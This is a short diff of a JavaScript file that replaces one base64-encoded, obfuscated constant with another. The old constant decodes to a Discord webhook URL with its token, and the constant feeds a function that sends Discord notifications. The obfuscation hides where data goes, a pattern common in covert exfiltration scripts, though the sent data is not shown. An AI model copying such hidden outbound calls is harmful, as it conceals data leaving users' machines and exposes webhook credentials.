@@ -1,6 +1,6 @@
 (function() {
     'use strict';
-    const _0x2b4a = ['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ2NTQwMzg2NjI5MDg0Nzk2OS9YcmFqYi1hU3hwMnNja2xrWnpsNGUwc1VpamRLaFUwb2xlMVBPZ3VpQV92NWd3bktHQkp0Zjl0M2pBRXh6bnNfdG9DQw=='];
+    const _0x2b4a = ['aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQ3NzQwNTg1OTg4ODg5OTM3L2swbTNChaB2bHZhVkFuVmFGZVdXUkNtbUFGZlNaUnB5cURPcVo4X1JNUVJrZ1c5NlFyeUZzNHc3M0NkmnZ1dGjNrNg=='];
     function _0x5f8c(_0x3a2b) {
         return atob(_0x3a2b[0]);
     }
@@ -256,4 +256,5 @@
         window.sendDiscordNotification();
     }
     
+
 })();
